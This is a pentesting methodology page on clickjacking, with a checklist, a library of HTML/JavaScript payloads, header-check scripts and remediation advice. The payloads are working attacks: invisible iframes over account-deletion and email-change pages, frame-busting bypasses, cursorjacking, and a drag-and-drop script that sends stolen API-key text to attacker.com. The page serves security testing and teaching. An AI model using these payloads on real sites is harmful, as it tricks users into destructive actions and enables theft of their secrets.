---
title: "Clickjacking"
date: 2026-02-24
draft: false
---

# Clickjacking

> **Severity**: Medium–High | **CWE**: CWE-1021
> **OWASP**: A04:2021 – Insecure Design

---

## What Is Clickjacking?

Clickjacking (UI redress attack) overlays an invisible `<iframe>` of the target site over a fake UI, tricking users into clicking target UI elements while believing they're interacting with the attacker's page.

```
Victim sees: "Click here to win a prize!" button
Reality:     Transparent iframe of target.com/delete-account is positioned
             so the victim clicks the "Confirm Delete" button instead
```

**Impact escalation**: clickjacking + CSRF → privileged actions; clickjacking + XSS → cookie theft; clickjacking drag-and-drop → text exfiltration.

---

## Discovery Checklist

- [ ] Check `X-Frame-Options` header: `DENY`, `SAMEORIGIN`, or missing
- [ ] Check `Content-Security-Policy: frame-ancestors` directive
- [ ] Test with basic iframe PoC — does target page load in iframe?
- [ ] Identify state-changing actions on the target page (delete, transfer, settings)
- [ ] Check if `X-Frame-Options` is on all pages or just login
- [ ] Test subdomain framing: does `SAMEORIGIN` allow same-org subdomains?
- [ ] Test with `sandbox` iframe attribute bypass
- [ ] Look for JavaScript frame-busting code and test bypass techniques

---

## Payload Library

### Payload 1 — Basic Clickjacking PoC

```html
<!-- Basic PoC — check if target loads in iframe -->
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    iframe {
      position: relative;
      width: 1000px;
      height: 700px;
      opacity: 0.5;   /* semi-transparent to see alignment */
      z-index: 2;
    }
    .decoy {
      position: absolute;
      top: 330px;
      left: 450px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <div class="decoy">
    <h2>Click here to claim your reward!</h2>
    <button>CLAIM</button>
  </div>
  <iframe src="https://target.com/account/delete" scrolling="no"></iframe>
</body>
</html>

<!-- Production payload (opacity: 0.000001 — invisible) -->
<style>
  #target-iframe {
    position: absolute;
    width: 1200px;
    height: 800px;
    top: 0; left: 0;
    opacity: 0.000001;
    z-index: 99999;
  }
</style>
<iframe id="target-iframe"
        src="https://target.com/settings/delete-account"
        scrolling="no">
</iframe>
```

### Payload 2 — Prefilled Input Clickjacking

```html
<!-- Pre-fill forms using URL parameters before framing: -->
<!-- If target.com/email-change?email=attacker@evil.com pre-fills the form: -->

<iframe src="https://target.com/account/email?email=attacker%40evil.com"
        style="opacity:0;position:absolute;top:X;left:Y;width:500px;height:200px;z-index:9">
</iframe>

<!-- Position decoy button exactly over "Save Changes" button -->
```

### Payload 3 — Frame Busting Bypass

```javascript
// Common frame-busting JS (what the target uses):
if (top !== self) { top.location = self.location; }
if (top.location !== self.location) { top.location = self.location; }
if (window.top !== window.self) { document.body.innerHTML = ''; }

// Bypass via sandbox iframe attribute:
// sandbox prevents JS execution in iframe → frame-busting JS doesn't run
<iframe src="https://target.com"
        sandbox="allow-forms allow-scripts"
        style="opacity:0;...">
</iframe>

// Bypass: allow-same-origin + allow-scripts lets JS run but can access parent
// Use: sandbox WITHOUT allow-same-origin → JS runs but can't navigate top frame
<iframe src="https://target.com"
        sandbox="allow-forms"
        style="opacity:0;...">
</iframe>
<!-- allows form submission but JS frame-busting can't run top.location = ... -->

// Bypass via onbeforeunload:
// Attacker page registers onbeforeunload → blocks top.location navigation
<script>
window.onbeforeunload = function() { return "Are you sure?"; };
</script>
<iframe src="https://target.com"></iframe>
```

### Payload 4 — Drag-and-Drop Clickjacking (Data Exfiltration)

```html
<!-- Exfiltrate text from target iframe via drag-and-drop:
     Works when iframed page shows sensitive data the user can select/drag -->
<html>
<body>
  <p>Drag the highlighted text below to the box:</p>
  <iframe src="https://target.com/account/api-keys"
          style="opacity:0.1;position:absolute;top:100px;left:50px;
                 width:600px;height:200px;z-index:5">
  </iframe>
  <div id="dropzone"
       style="width:400px;height:200px;border:2px dashed red;
              position:absolute;top:350px;left:50px;z-index:6"
       ondrop="steal(event)"
       ondragover="event.preventDefault()">
    Drop here
  </div>
  <script>
  function steal(e) {
    e.preventDefault();
    var data = e.dataTransfer.getData("text");
    fetch("https://attacker.com/steal?data=" + encodeURIComponent(data));
  }
  </script>
</body>
</html>
```

### Payload 5 — Cursorjacking

```html
<!-- Make real cursor invisible, show fake cursor offset to deceive click position -->
<style>
  body { cursor: none; }
  #fake-cursor {
    position: absolute;
    width: 20px;
    height: 20px;
    background: url('cursor.png') no-repeat;
    pointer-events: none;
    z-index: 99999;
    /* offset from real cursor: */
    transform: translate(-50px, -80px);
  }
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.000001;
    z-index: 2;
  }
</style>
<div id="fake-cursor"></div>
<iframe src="https://target.com/admin"></iframe>
<script>
document.addEventListener('mousemove', function(e) {
  var c = document.getElementById('fake-cursor');
  c.style.left = e.pageX + 'px';
  c.style.top = e.pageY + 'px';
});
</script>
```

---

## Tools

```bash
# Clickjack testing tools:
# 1. Burp Suite — check X-Frame-Options in response headers
curl -sI https://target.com/ | grep -i "x-frame\|frame-ancestors\|content-security"

# 2. clickjack.html — simple PoC generator:
cat > clickjack_test.html << 'EOF'
<html>
<style>
  iframe { width: 1000px; height: 700px; opacity: 0.5; }
</style>
<body>
  <iframe src="TARGET_URL"></iframe>
  <p>If you can see the page above in the iframe — it's vulnerable!</p>
</body>
</html>
EOF
sed -i "s|TARGET_URL|$1|g" clickjack_test.html

# 3. Python check:
python3 -c "
import requests
r = requests.get('https://target.com/', timeout=10)
xfo = r.headers.get('X-Frame-Options', 'MISSING')
csp = r.headers.get('Content-Security-Policy', '')
fa = [d for d in csp.split(';') if 'frame-ancestors' in d.lower()]
print(f'X-Frame-Options: {xfo}')
print(f'CSP frame-ancestors: {fa if fa else \"not set\"}')
if xfo == 'MISSING' and not fa:
    print('[VULNERABLE] No framing protection!')
"

# 4. Check all pages (not just homepage):
for path in / /login /account/settings /admin; do
  xfo=$(curl -sI "https://target.com$path" | grep -i "x-frame" | tr -d '\r')
  echo "$path → ${xfo:-MISSING}"
done
```

---

## Remediation Reference

- **`Content-Security-Policy: frame-ancestors 'none'`** — modern, preferred approach (also covered by CSP)
- **`X-Frame-Options: DENY`** — legacy header, still supported widely; use alongside CSP
- **`X-Frame-Options: SAMEORIGIN`** — allows framing by same origin only
- **JavaScript frame-busting is NOT a reliable defense** — easily bypassed via `sandbox` attribute
- **SameSite=Lax/Strict cookie** reduces impact (cross-site iframe won't send cookies on click actions)
- For apps that legitimately embed in iframes: use `frame-ancestors https://trusted.com` specifically

*Part of the Web Application Penetration Testing Methodology series.*
